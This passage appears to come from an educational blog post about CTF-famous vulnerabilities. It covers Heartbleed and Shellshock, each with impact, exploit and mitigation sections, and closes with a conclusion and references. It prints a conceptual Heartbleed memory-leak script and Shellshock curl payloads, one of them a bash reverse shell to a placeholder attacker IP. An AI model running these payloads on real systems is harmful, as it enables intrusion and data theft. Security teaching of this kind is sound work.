**Real-World Impact:** The Heartbleed vulnerability had a devastating impact because it allowed attackers to steal sensitive information protected by SSL/TLS encryption. This included:

*   **Private Keys:** Attackers could steal the server's private SSL keys, allowing them to decrypt past and future encrypted traffic, impersonate the server, and perform man-in-the-middle attacks.
*   **User Credentials:** Usernames, passwords, and session cookies could be leaked from the server's memory.
*   **Sensitive Data:** Other confidential information processed by the vulnerable server, such as personal data, financial details, and proprietary information, could be exposed.

Millions of websites, email servers, VPNs, and other services relying on vulnerable OpenSSL versions were affected.

**Technical Details and Exploitation:**

The exploitation of Heartbleed involves sending a malformed heartbeat request to a vulnerable server.

**Example Exploit (Conceptual Python script using `socket`):**

```python
import socket
import struct
import time

# This is a simplified conceptual script and may not work against all targets
# or without modifications. Real exploits are more nuanced.

def hex_to_bytes(hex_string):
    return bytes.fromhex(hex_string)

# Malformed heartbeat request
# Type: 18 (Heartbeat)
# Version: 03 02 (TLS 1.1, can vary)
# Length: 00 03 (Payload length 3 bytes)
# Payload: 01 40 00 (Heartbeat Message Type: Request, Payload Length: 16384 (0x4000) - this is the lie)

# Construct the heartbeat request
# TLS Header (5 bytes: Content Type, Version, Length)
# Heartbeat Message (1 byte: Type, 2 bytes: Payload Length, Payload, Padding)

# Simplified Heartbeat Request (actual structure is more complex)
# For demonstration, we'll focus on the core idea of a small actual payload
# but a large claimed length in the heartbeat message itself.

# A more accurate (but still simplified) construction:
# Content Type: 0x18 (Heartbeat)
# Version: 0x0301 (TLS 1.0) or 0x0302 (TLS 1.1) or 0x0303 (TLS 1.2)
# Record Length: Length of the heartbeat message (e.g., 1 + 2 + actual_payload_len)
# Heartbeat Message Type: 0x01 (Request)
# Heartbeat Payload Length (Claimed): 0x4000 (16384 bytes)
# Actual Payload: (e.g., 1 byte of actual data)

# For a real exploit, you'd need to establish a TLS connection first.
# This example oversimplifies the process.

TARGET_HOST = "<vulnerable_server_ip>"
TARGET_PORT = 443 # HTTPS

def construct_heartbeat(payload_length_claimed=0x4000, actual_payload=b'\x01'):
    # TLS Record Layer: Heartbeat (0x18), Version (e.g., TLS 1.1 = 0x0302), Record Length
    # Heartbeat Protocol: Type (Request = 0x01), Payload Length (claimed), Actual Payload
    hb_type = b'\x01'  # Request
    hb_payload_len_claimed = struct.pack('>H', payload_length_claimed)
    hb_actual_payload = actual_payload

    # Heartbeat message itself
    heartbeat_message = hb_type + hb_payload_len_claimed + hb_actual_payload

    # TLS record header (simplified)
    # Content Type (Heartbeat = 24), Version (TLS 1.1 = 0x0302), Length of heartbeat_message
    tls_header = b'\x18\x03\x02' + struct.pack('>H', len(heartbeat_message))
    return tls_header + heartbeat_message

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))

    # Send ClientHello (simplified - real ClientHello is complex)
    # In a real scenario, a full TLS handshake up to the point where heartbeats are allowed is needed.
    # For CTFs, often a simplified setup or a provided vulnerable binary is used.
    # This script is highly conceptual for the heartbeat part.

    print("Sending conceptual malformed heartbeat...")
    malformed_hb = construct_heartbeat()
    s.sendall(malformed_hb)

    # Listen for the server's response (which will contain leaked memory)
    leaked_data_parts = []
    s.settimeout(5)
    try:
        while True:
            part = s.recv(4096)
            if not part:
                break
            leaked_data_parts.append(part)
    except socket.timeout:
        print("Socket timeout while receiving data.")
    except Exception as e:
        print(f"Error receiving data: {e}")
    finally:
        s.close()

    if leaked_data_parts:
        leaked_data = b''.join(leaked_data_parts)
        # The actual leaked memory will be within the heartbeat response structure
        # Proper parsing of the TLS record and heartbeat response is needed here.
        print("Received potentially leaked data (raw bytes):")
        print(leaked_data)
        # In a real exploit, you'd parse this to extract meaningful info.
    else:
        print("No data received or connection closed early.")

except Exception as e:
    print(f"An error occurred: {e}")

```

Specialized tools like `sslscan` or dedicated Heartbleed exploit scripts (e.g., `heartbleed-poc.py`) are typically used for reliable exploitation.

**Mitigation:** The primary mitigation for Heartbleed is to upgrade OpenSSL to a patched version (1.0.1g or later). Additionally, after patching, it is crucial to:

*   **Revoke and Reissue SSL Certificates:** Since private keys could have been compromised, all SSL certificates issued for vulnerable servers should be revoked and new ones generated with new private keys.
*   **Change Passwords and Session Keys:** All user passwords, session keys, and other sensitive credentials that might have been exposed should be invalidated and reset.
*   **Implement Perfect Forward Secrecy (PFS):** Configure web servers to use cipher suites that support PFS. This ensures that even if a server's long-term private key is compromised, past encrypted sessions cannot be decrypted.

---



## 10. **CVE-2014-6271: Shellshock (Bash Remote Code Execution)**

**CTF Origin:** The Shellshock vulnerability, a critical flaw in the Bash shell, sent shockwaves through the cybersecurity world in 2014. Its widespread impact and the ease with which it could be exploited made it an immediate and enduring favorite for CTF challenges. Many CTFs feature scenarios where participants must exploit Shellshock to gain remote code execution on vulnerable web servers or other services that use Bash. This allows players to understand the nuances of environment variable parsing and command injection.

**Vulnerability Description:** *CVE-2014-6271*, commonly known as Shellshock, is a remote code execution vulnerability in the GNU Bash shell. The vulnerability arises from a flaw in how Bash processes specially crafted environment variables. Specifically, Bash incorrectly executes trailing commands when a function definition is passed in an environment variable. This means that if a program or service passes untrusted input into an environment variable that is then processed by a vulnerable Bash instance, an attacker can inject and execute arbitrary commands.

**Real-World Impact:** Shellshock had a massive impact due to Bash being a fundamental component of most Unix-like operating systems, including Linux and macOS. Many web servers (e.g., Apache with mod_cgi), DHCP clients, SSH servers, and other applications use Bash to process various inputs. Successful exploitation could lead to:

*   **Remote Code Execution:** Unauthenticated attackers could execute arbitrary commands on vulnerable systems.
*   **Web Server Compromise:** Attackers could gain full control over web servers, leading to website defacement, data theft, and further network penetration.
*   **System Takeover:** In some cases, attackers could achieve root privileges, leading to complete system compromise.
*   **Botnet Creation:** Vulnerable systems were quickly recruited into botnets for DDoS attacks or other malicious activities.

**Technical Details and Exploitation:**

The core of the Shellshock vulnerability lies in the parsing of environment variables. A malicious payload is typically injected into an HTTP header (like `User-Agent`, `Referer`, or `Cookie`) when a web server uses CGI scripts that invoke Bash.

**Example Exploit (Conceptual `curl` request):**

Assume a vulnerable CGI script (e.g., `cgi-bin/test.cgi`) exists on the web server.

```bash
# Example: Execute `id` command and echo the output
# The payload is injected into the User-Agent header.
# The `() { :; };` part defines an empty function, which Bash processes.
# The `echo "Content-type: text/plain"; echo; id` part is the injected command.
curl -H "User-Agent: () { :; }; echo \"Content-type: text/plain\"; echo; id" \
"http://<target_ip>/cgi-bin/test.cgi"

# Example: Spawning a reverse shell (replace with your IP and port)
# This payload attempts to connect back to the attacker's machine.
curl -H "User-Agent: () { :; }; echo \"Content-type: text/plain\"; echo; bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" \
"http://<target_ip>/cgi-bin/test.cgi"
```

**Explanation of the payload:**

*   `() { :; };`: This is a valid Bash function definition. Vulnerable versions of Bash incorrectly continue parsing and executing commands after this definition.
*   `echo "Content-type: text/plain"; echo;`: These lines are necessary for the CGI script to return a valid HTTP response, preventing errors and allowing the output of the injected command to be seen.
*   `id`: The arbitrary command to be executed (e.g., `id`, `ls -la`, `cat /etc/passwd`).
*   `bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1`: A common reverse shell payload that connects back to the attacker's machine.

**Mitigation:** The most critical mitigation for Shellshock is to update Bash to a patched version. Operating system vendors quickly released patches to address the vulnerability. Additionally, it is important to:

*   **Input Validation:** Implement strict input validation for all environment variables and user-supplied input that might be processed by Bash.
*   **Principle of Least Privilege:** Run web servers and other services with the minimum necessary privileges.
*   **Disable Unnecessary CGI Scripts:** Disable or remove any CGI scripts that are not essential.
*   **Web Application Firewall (WAF):** Deploy a WAF to detect and block Shellshock exploitation attempts.
*   **Regular Patching:** Maintain a rigorous patching schedule for all software components, especially operating system components.

---



## Conclusion

The journey from CTF challenge to real-world exploit is a testament to the dynamic and ever-evolving nature of cybersecurity. As we've seen with vulnerabilities like Log4Shell, Heartbleed, and various RCEs, the skills honed in the simulated environments of Capture The Flag competitions directly contribute to understanding, identifying, and mitigating critical security flaws in the wild.

CTFs serve as valuable training grounds, pushing participants to think creatively, understand complex systems, and develop practical exploitation and defense techniques. The examples discussed in this blog post underscore the importance of continuous learning, proactive security measures, and the vital role the cybersecurity community plays in securing our digital landscape. By bridging the gap between theoretical challenges and real-world threats, CTFs not only prepare the next generation of security professionals but also contribute to a more secure internet for everyone.

---

## References

1.  **CVE-2016-5007 (Spring Security/MVC Path Matching Inconsistency):**
    *   [NVD - CVE-2016-5007](https://nvd.nist.gov/vuln/detail/cve-2016-5007)
    *   [Spring Security/MVC Path Matching Inconsistency (CVE-2016-5007)](https://spring.io/security/cve-2016-5007)

2.  **CVE-2022-33891 (Apache Spark Shell Command Injection):**
    *   [NVD - CVE-2022-33891](https://nvd.nist.gov/vuln/detail/cve-2022-33891)
    *   [Snyk's Fetch the Flag CTF is More Than Just a CTF](https://snyk.io/blog/snyks-fetch-the-flag-ctf/)
    *   [HuskyHacks/cve-2022-33891 (GitHub PoC)](https://github.com/HuskyHacks/cve-2022-33891)

3.  **CVE-2020-6512 (Google Chrome V8 Type Confusion):**
    *   [NVD - CVE-2020-6512](https://nvd.nist.gov/vuln/detail/cve-2020-6512)
    *   [Type Confusion in chromium | CVE-2020-6512](https://security.snyk.io/vuln/SNYK-UNMANAGED-CHROMIUM-2409207)

4.  **CVE-2012-1823 (PHP CGI Remote Code Execution):**
    *   [NVD - CVE-2012-1823](https://nvd.nist.gov/vuln/detail/cve-2012-1823)
    *   [PHP - Remote Code Execution (CVE-2012-1823)](https://pentest-tools.com/vulnerabilities-exploits/php-remote-code-execution_23031)
    *   [CVE-2012-1823: PHP CGI Free Exercise!](https://pentesterlab.com/exercises/cve-2012-1823)

5.  **CVE-2019-20372 (NGINX HTTP Request Smuggling):**
    *   [NVD - CVE-2019-20372](https://nvd.nist.gov/vuln/detail/cve-2019-20372)
    *   [HTTP Request Smuggling in nginx | CVE-2019-20372](https://security.snyk.io/vuln/SNYK-ALPINE320-NGINX-7010360)
    *   [0xleft/CVE-2019-20372 (GitHub PoC)](https://github.com/0xleft/CVE-2019-20372)

6.  **CVE-2019-2684 (Java Zero-Day Exploited in CTF):**
    *   [NVD - CVE-2019-2684](https://nvd.nist.gov/vuln/detail/cve-2019-2684)
    *   [Hey, I played in that CTF! Although, I ended up spending... (Hacker News)](https://news.ycombinator.com/item?id=25797954)

7.  **CVE-2019-9053 (CMS Made Simple SQL Injection):**
    *   [NVD - CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
    *   [CMS Made Simple < 2.2.10 - SQL Injection (Exploit-DB)](https://www.exploit-db.com/exploits/46635)
    *   [Unauthenticated SQL injection exploit for CVE-2019-9053 (GitHub PoC)](https://github.com/so1icitx/CVE-2019-9053)

8.  **CVE-2021-44228 (Apache Log4j Remote Code Execution - Log4Shell):**
    *   [NVD - CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)
    *   [Apache log4j Vulnerability CVE-2021-44228 (Palo Alto Networks)](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)
    *   [Write-Up: Web - Log4j & Log4j2 from Google CTF 2022](https://www.sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

9.  **CVE-2014-0160 (OpenSSL Heartbleed):**
    *   [NVD - CVE-2014-0160](https://nvd.nist.gov/vuln/detail/cve-2014-0160)
    *   [The Heartbleed Bug](https://www.heartbleed.com/)

10. **CVE-2014-6271 (Shellshock - Bash Remote Code Execution):**
    *   [NVD - CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271)
    *   [Lab Walkthrough - Shockin' Shells: ShellShock (CVE-2014-6271)](https://ine.com/blog/shockin-shells-shellshock-cve-2014-6271)



---

 > *Got questions? Feel free to reach out!*